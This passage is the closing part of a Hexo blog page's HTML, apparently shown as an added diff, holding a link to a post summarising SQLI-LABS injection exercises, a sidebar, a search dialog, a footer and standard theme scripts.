+                      <a href="/2021/05/09/SQLI-LABS%E6%B3%A8%E5%85%A5%E5%B0%8F%E7%BB%93%EF%BC%88Less-1%EF%BD%9ELess-28a%EF%BC%89/" title="SQLI-LABS注入小结（Less-1～Less-28a）">
+                        <span class="hidden-mobile">SQLI-LABS注入小结（Less-1～Less-28a）</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>Table of Contents</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>By Cayce</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+</body>
+</html>
